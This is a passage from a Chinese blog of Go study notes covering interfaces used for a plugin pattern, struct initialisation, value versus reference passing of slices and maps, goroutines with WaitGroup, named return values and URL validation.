class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> enabled() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.Enable</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pluginBase)</span></span> setEnabled(enable <span class="type">bool</span>) &#123;</span><br><span class="line">	p.Enable = enable</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> plugin <span class="keyword">interface</span> &#123;                  <span class="comment">// 定义接口，声明需要实现enabled和setEnabled方法</span></span><br><span class="line">	enabled() <span class="type">bool</span></span><br><span class="line">	setEnabled(enable <span class="type">bool</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cmdInjection <span class="keyword">struct</span> &#123;               <span class="comment">// 定义结构体cmdInjection，因为匿名继承了pluginBase结构体，也就继承了其方法</span></span><br><span class="line">	pluginBase                           <span class="comment">// 当然也可以cmdInjection自己定义enabled和setEnabled方法</span></span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cmdInjection)</span></span> getName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> c.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	plugins := []plugin&#123;&#125;                               <span class="comment">// 定义元素类型为plugin的切片</span></span><br><span class="line">	plugins = <span class="built_in">append</span>(plugins, &amp;cmdInjection&#123;           <span class="comment">// 因为cmdInjection实现了接口plugin声明的方法，所以cmdInjection被认为是plugin类型</span></span><br><span class="line">		name: <span class="string">&quot;command injection&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">for</span> _, plugin := <span class="keyword">range</span> plugins &#123;                  <span class="comment">// 通过循环遍历插件</span></span><br><span class="line">		plugin.run()                                  <span class="comment">// 运行插件</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">command injection</span><br></pre></td></tr></table></figure>

<p>在上面的代码中，比如我想定义很多插件，但每个插件都有自己定义的结构体，想使用统一的切片来储存初始化后的插件，但golang中需要对切片的元素类型进行声明，就可以使用上面的方法：统一定义一个plugin的接口（有点类似于基类），下面的各种不同的插件（例如cmdInjection插件，有点像子类）实现plugin接口声明的方法，使用统一的切片[]plugin来保存初始化后的插件，后续可以通过循环来调用插件的方法，这样代码看起来就很优雅O(∩_∩)O</p>
<h2 id="10、golang结构体的初始化"><a href="#10、golang结构体的初始化" class="headerlink" title="10、golang结构体的初始化"></a>10、golang结构体的初始化</h2><p>目前我见到的结构体初始化赋值的方法大概分为3类：</p>
<p><strong>1）创建结构体时进行赋值（若引用外部package的结构体，只能赋值首字母大写的成员变量）</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    output <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t := test&#123;</span><br><span class="line">    Name: <span class="string">&quot;test&quot;</span>,   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>2） 通过构造函数（若外部package定义的结构体中有私有变量(首字母小写)，可以通过这个方法，但构造函数名首字母需大写）</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目录结构：</span></span><br><span class="line"><span class="comment">// - test1</span></span><br><span class="line"><span class="comment">//   - test1.go</span></span><br><span class="line"><span class="comment">// - test2</span></span><br><span class="line"><span class="comment">//   - test2.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// test1.go</span></span><br><span class="line"><span class="keyword">package</span> test1</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    private <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTest</span><span class="params">(name, private <span class="type">string</span>)</span></span> *test &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;test&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        private: private,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test2.go</span></span><br><span class="line"><span class="keyword">package</span> test2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;test1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">()</span></span> &#123;</span><br><span class="line">    test1 := test1.NewTest(<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;private&quot;</span>)</span><br><span class="line">    fmt.Println(test1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>3）通过另类的构造函数（这里仅记录方法，看着比较优雅）</strong></p>
<p>golang中可以给变量定义为函数类型，函数的返回值也可以是函数类型</p>
<p>可以定义赋值函数，再将赋值函数传入构造函数中，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PoCMon <span class="keyword">struct</span> &#123;</span><br><span class="line">    passwords []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PocMonOption <span class="function"><span class="keyword">func</span><span class="params">(p *PoCMon)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithPasswords</span><span class="params">(passwords []<span class="type">string</span>)</span></span> PocMonOption &#123;          <span class="comment">// 定义并返回赋值函数，在赋值函数中设置结构体变量的值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *PoCMon)</span></span> &#123;</span><br><span class="line">        p.passwords = passwords</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewPoCMon 根据选项生成PoCMon实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPoCMon</span><span class="params">(options ...PocMonOption)</span></span> *PoCMon &#123;                <span class="comment">// 结构体构造函数，传参赋值函数</span></span><br><span class="line">    p := &amp;PoCMon&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, option := <span class="keyword">range</span> options &#123;</span><br><span class="line">        option(p)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">password := []<span class="type">string</span>&#123;<span class="string">&quot;123456&quot;</span>, <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">p = NewPoCMon(                               <span class="comment">// 调用构造函数，参数为赋值函数</span></span><br><span class="line">        WithPasswords(password),              <span class="comment">// 传参赋值函数</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-study-golang-record-1"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/05/study-golang-record-1/"
    >Golang学习记录之一</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/05/study-golang-record-1/" class="article-date">
  <time datetime="2022-04-05T07:13:22.000Z" itemprop="datePublished">2022-04-05</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>​最近在学习golang，在学习过程中记录一下遇到过的那些坑以及一些个人使用的第三方库</p>
<p>​由于遇到的坑有点多，故分成几篇进行记录，后面遇到的坑 or 小技巧也会进行补充 (&#x3D;￣ω￣&#x3D;)</p>
<h2 id="1、值传递-amp-amp-查看变量类型"><a href="#1、值传递-amp-amp-查看变量类型" class="headerlink" title="1、值传递 &amp;&amp; 查看变量类型"></a>1、值传递 &amp;&amp; 查看变量类型</h2><p>golang在进行函数调用时，默认使用值传递，即在子函数内对参数变量进行修改不影响父函数中变量的值</p>
<p>但有一些类型的变量是引用类型的，包括Slice、Map和Channel类型，即函数内的修改仍然会影响函数外的值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	param1 := <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">	param2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)   <span class="comment">// make函数返回的是一个hmap类型的指针*hmap，为指针类型</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;param1 address in main: %p\n&quot;</span>, &amp;param1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in main: %p\n&quot;</span>, param2)</span><br><span class="line">	test(param1, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(param1 <span class="type">string</span>, param2 <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param1 address in test: %p\n&quot;</span>, &amp;param1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">param1 address in main: <span class="number">0xc000010280</span>  </span><br><span class="line">param2 address in main: <span class="number">0xc00006a150</span></span><br><span class="line">param1 address in test: <span class="number">0xc000010290</span>    <span class="comment">// 字符串类型为值传递</span></span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span>    <span class="comment">// map类型为引用传递</span></span><br></pre></td></tr></table></figure>

<p>tips：slice比较特殊，若在子函数中修改切片的值，是可以修改父函数中切片的值，但若进行扩容操作，则不会同步到父函数切片中</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	param2 := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in main: %p\n&quot;</span>, param2)</span><br><span class="line">	test1(param2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in main: &quot;</span>, param2)</span><br><span class="line">	test2(param2)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in main: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(param2 []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">	param2 = <span class="built_in">append</span>(param2, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in test1: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test2</span><span class="params">(param2 []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;param2 address in test: %p\n&quot;</span>, param2)</span><br><span class="line">	param2[<span class="number">0</span>] = <span class="string">&quot;e&quot;</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;param2 in test2: &quot;</span>, param2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">param2 address in main: <span class="number">0xc00006a150</span></span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span></span><br><span class="line">param2 in test1:  [a b c d]</span><br><span class="line">param2 in main:  [a b c]</span><br><span class="line">param2 address in test: <span class="number">0xc00006a150</span></span><br><span class="line">param2 in test2:  [e b c]</span><br><span class="line">param2 in main:  [e b c]</span><br></pre></td></tr></table></figure>

<p>究其原因，是由于slice为一个golang内置的一个结构体类型，传递slice的时候，这个结构体是值传递的，传递完成后，内存中有两个slice结构体，它们引用同一块slice数组</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// slice结构体定义</span></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">	array unsafe.Pointer</span><br><span class="line">	<span class="built_in">len</span>   <span class="type">int</span></span><br><span class="line">	<span class="built_in">cap</span>   <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当对切片内已有元素进行修改时，修改的是array指针指向的底层数据，但若进行扩容时，修改的是子函数结构体中的len以及cap，不会传递回父函数中</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6999653704433401887">https://juejin.cn/post/6999653704433401887</a></p>
<h2 id="2、golang协程"><a href="#2、golang协程" class="headerlink" title="2、golang协程"></a>2、golang协程</h2><p>golang内置了协程机制，使用关键字go即可</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> test1()   <span class="comment">// 使用协程运行子函数，但main函数没有阻塞，会继续向下走而导致程序退出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但若在main函数中只使用协程，可能协程运行的子函数还没运行完主程序推出了，故需要配合sync.WaitGroup来使用协程</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	s := sync.WaitGroup&#123;&#125;</span><br><span class="line">	s.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> test1(&amp;s)    <span class="comment">// 注意这里要传递指针  如果不使用指针类型就无法引用到同一个 WaitGroup变量，便也不能依赖 WaitGroup 来实现同步了</span></span><br><span class="line">	s.Wait()        <span class="comment">// wait会阻塞进程，等待waitgroup中所有协程执行完毕</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(s *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> s.Done()</span><br><span class="line">	fmt.Println(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>golang对sync.WaitGroup中的协程数量没有限制，如果短时间内创建大量协程可能会导致系统内存不够而程序异常退出，所以大部分场景下需要控制协程的数量</p>
<p>这里我习惯使用github.com&#x2F;remeh&#x2F;sizedwaitgroup这个第三方库来控制协程数量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	s := sizedwaitgroup.New(<span class="number">5</span>)   <span class="comment">// 限制协程数量，最多同时执行5个协程</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">20</span>; i++ &#123;</span><br><span class="line">		s.Add()</span><br><span class="line">		<span class="keyword">go</span> test1(&amp;s)</span><br><span class="line">	&#125;</span><br><span class="line">	s.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test1</span><span class="params">(s *sizedwaitgroup.SizedWaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> s.Done()</span><br><span class="line">	fmt.Println(time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">	time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ubuntu@test:~/$ <span class="keyword">go</span> run test.<span class="keyword">go</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">34</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">36</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">38</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br><span class="line"><span class="number">2022</span><span class="number">-04</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">40</span></span><br></pre></td></tr></table></figure>



<h2 id="3、系统性能显示"><a href="#3、系统性能显示" class="headerlink" title="3、系统性能显示"></a>3、系统性能显示</h2><p>我这里用github.com&#x2F;shirou&#x2F;gopsutil来显示当前系统cpu占用率 内存占用率</p>
<p>使用runtime来返回当前系统的cpu核数量，GOMAXPROCS设置最大可同时使用的cpu核数（自Go 1.5开始， Go的GOMAXPROCS默认值已经设置为CPU的核数），GOOS返回系统类型</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/126362239">https://zhuanlan.zhihu.com/p/126362239</a></p>
<h2 id="4、golang函数返回"><a href="#4、golang函数返回" class="headerlink" title="4、golang函数返回"></a>4、golang函数返回</h2><p>Go语言支持对返回值进行命名，这样返回值就和参数一样拥有参数变量名和类型</p>
<p>命名的返回值变量的默认值是类型的零值，如数值类型是0，字符串类型是空字符串，布尔类型是false、指针类型是nil等</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>) &#123;</span><br><span class="line">    a = <span class="number">1</span>    <span class="comment">// 函数声明时带有返回值变量a和b，因此可以在函数体中直接对函数返回值变量进行赋值  函数命名返回值和函数参数一样，也是函数的局部变量</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span>   <span class="comment">// 使用return隐式返回  </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时也可以下面这么写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同一种类型返回值和命名返回值两种形式只能二选一，混用时将会发生编译错误。例如下面的代码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">namedRetValues</span><span class="params">()</span></span> (a, b <span class="type">int</span>, <span class="type">int</span>)   </span><br></pre></td></tr></table></figure>



<h2 id="5、检查-amp-amp-解析url"><a href="#5、检查-amp-amp-解析url" class="headerlink" title="5、检查&amp;&amp;解析url"></a>5、检查&amp;&amp;解析url</h2><p>在解析url之前需要先检查一下url的格式是否正确</p>
<p>net&#x2F;url库虽然可以解析url，但没有提供检查格式是否正确</p>
<p>我使用github.com&#x2F;asaskevich&#x2F;govalidator来检查url格式，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/url&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/asaskevich/govalidator&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    host := <span class="string">&quot;postgres://user:pass@host.com:5432/path?k=v#f&quot;</span></span><br><span class="line">    isurl := govalidator.IsURL(host)     <span class="comment">// 检查url格式</span></span><br><span class="line">	<span class="keyword">if</span> isurl &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;host is right&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;host is error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	u, _ := url.Parse(host)</span><br><span class="line">    fmt.Println(u.Scheme)   <span class="comment">// 具体指访问服务器上的资源使用的哪种协议</span></span><br><span class="line">    fmt.Println(u.Host)     <span class="comment">// host或host:port，服务器地址，可以是 IP 地址，也可以是域名信息</span></span><br><span class="line">    fmt.Println(u.Path)     <span class="comment">// 路径，使用&quot;/&quot;分隔</span></span><br><span class="line">    fmt.Println(u.RawQuery) <span class="comment">// 编码后的查询字符串，没有&#x27;?&#x27;</span></span><br><span class="line">    m, _ := url.ParseQuery(u.RawQuery)</span><br><span class="line">	fmt.Println(m)</span><br><span class="line">	fmt.Println(m[<span class="string">&quot;k&quot;</span>][<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">host is right</span><br><span class="line">postgres</span><br><span class="line">host.com:<span class="number">5432</span></span><br><span class="line">/path</span><br><span class="line">k=v</span><br><span class="line"><span class="keyword">map</span>[k:[v]]</span><br><span class="line">v</span><br></pre></td></tr></table></figure>



<h2 id="6、结构体传参"><a href="#6、结构体传参" class="headerlink" title="6、结构体传参"></a>6、结构体传参</h2><p>golang中函数的传参是值的传递，那对于结构体来说呢？  下面进行一个实验</p>
